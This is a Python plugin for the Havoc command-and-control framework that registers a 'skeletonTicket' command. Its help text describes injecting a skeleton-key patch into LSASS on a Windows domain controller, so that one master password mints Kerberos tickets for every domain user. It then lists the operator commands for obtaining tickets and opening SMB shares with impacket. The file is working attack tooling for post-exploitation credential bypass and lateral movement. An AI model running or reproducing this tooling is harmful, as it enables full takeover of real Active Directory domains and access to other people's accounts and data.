from havoc import Demon, RegisterCommand


SKELETONTICKET_HELP = """skeletonTicket <password>
    AES all-users skeleton key — ONE cleartext master password mints a usable
    TGT for every domain user (Server 2025 / Kerb3961.dll 26100.33158).
    Real passwords are preserved (adaptive: substitution only follows a failed
    pre-auth). TGT method only — no DCSync/arm-table, no RC4/NTLM path.

    skeletonTicket Password123!        install hooks + arm (all users), one shot
    skeletonTicket status <ctx>        diagnostics (fires / substHits)
    skeletonTicket cleanup <ctx>       disarm (mode 0); reboot also clears

    Mint a TGT from the operator box (2nd attempt succeeds):
      python3 skel_gettgt.py 'Password123!' halcyon.local <user> <dc-ip>
      export KRB5CCNAME=$PWD/<user>.ccache
      echo shares | impacket-smbclient -k -no-pass \\
        'halcyon.local/<user>@halcyondc.halcyon.local' -dc-ip <dc-ip>

Notes:
    - Requires SYSTEM or SeDebugPrivilege (enabled on entry).
    - The patch lives in LSASS until reboot (no persistence).
    - Restart the Havoc client after a rebuild — it caches bin/skeletonTicket.o.
"""


def skeletonTicket(demonID, *params):
    demon = Demon(demonID)

    if not params:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, SKELETONTICKET_HELP)
        return

    # flatten params (ints/floats for ctx, strs for everything else) into one
    # command line string — the BOF parses whitespace itself.
    cmdline = " ".join(str(p) for p in params).strip()
    if not cmdline:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, SKELETONTICKET_HELP)
        return

    packer = Packer()
    packer.addstr(cmdline)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon: skeletonTicket {cmdline}")
    demon.InlineExecute(TaskID, "go", f"bin/skeletonTicket.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


RegisterCommand(skeletonTicket, "", "skeletonTicket",
    "AES all-users skeleton key — cleartext master password mints a TGT for any domain user", 0,
    SKELETONTICKET_HELP, "skeletonTicket install")
